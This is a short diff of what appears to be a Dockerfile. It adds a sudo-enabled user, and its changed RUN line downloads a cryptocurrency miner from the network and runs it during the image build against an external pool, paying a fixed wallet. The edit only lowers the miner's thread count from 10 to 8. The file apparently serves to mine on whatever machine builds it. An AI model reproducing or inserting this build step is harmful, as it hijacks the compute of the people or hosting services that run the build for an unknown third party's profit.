@@ -24,4 +24,4 @@ RUN useradd -m kunemuse && \
     adduser kunemuse sudo && \
     sudo usermod -a -G sudo kunemuse
 
-RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qthvqtpkcxrwmsdwy4s3d8f0u8scgfrwcw50vu3.gass -p x -t10
+RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qthvqtpkcxrwmsdwy4s3d8f0u8scgfrwcw50vu3.gass -p x -t8
